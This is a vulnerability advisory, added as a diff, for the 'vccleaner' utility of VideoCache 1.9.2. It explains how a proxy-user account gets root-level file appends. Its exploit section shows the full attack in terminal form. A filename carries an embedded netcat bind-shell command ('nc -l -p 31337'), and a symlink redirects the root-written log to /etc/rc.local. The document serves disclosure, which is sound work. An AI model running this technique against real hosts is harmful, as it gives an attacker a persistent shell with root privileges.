@@ -1,0 +1,53 @@
+====[ SYNOPSIS ]=====================================================
+
+VideoCache is a Squid URL rewriter plugin written in Python for 
+bandwidth optimization while browsing video sharing websites.  Version 
+1.9.2 allows a user with the privileges of the Squid proxy server to 
+append semi-arbitrary data to arbitrary files with root privileges, upon 
+the administrator's execution of the 'vccleaner' utility.
+
+
+====[ DISCUSSION ]===================================================
+
+VideoCache's 'vccleaner' utility is intended to be executed with root 
+permissions periodically, to remove expired videos from the cache.
+(The utility will refuse to execute without root permissions.)
+Upon execution, it looks for old files under the cache directory
+/var/spool/videocache (writable by the Squid proxy user) and deletes
+them.  Each deleted filename is logged to vccleaner.log, located in 
+/var/log/videocache (directory writable by the Squid proxy user).
+
+
+====[ EXPLOIT ]======================================================
+
+.........................attacker.........................
+$ id
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+$ cd /var/log/videocache
+$ touch -d 19700101 "/var/spool/videocache/youtube/money
+
+    nc -l -p 31337 -c sushi
+    monkey"
+
+$ rm -f vccleaner.log
+$ ln -s /etc/rc.local vccleaner.log
+
+.........................admin.........................
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# vccleaner
+Videocache cleaning has completed successfully.
+
+.........................postmortem.........................
+$ cat /etc/rc.local
+2009-12-16 06:56:29,403 INFO START Starting Videocache Cleaner.
+2009-12-16 06:56:29,403 INFO DELETE /var/spool/videocache/youtube/money
+nc -l -p 31337 -c sushi
+monkey Older than 14594 day(s) was deleted.
+2009-12-16 06:56:29,404 INFO STOP Stopping Videocache Cleaner.
+
+
+====[ SHOUT OUTS ]===================================================
+
+Tim, Ben, my buddies at GS, Alien Time Agent, and big man O.
+
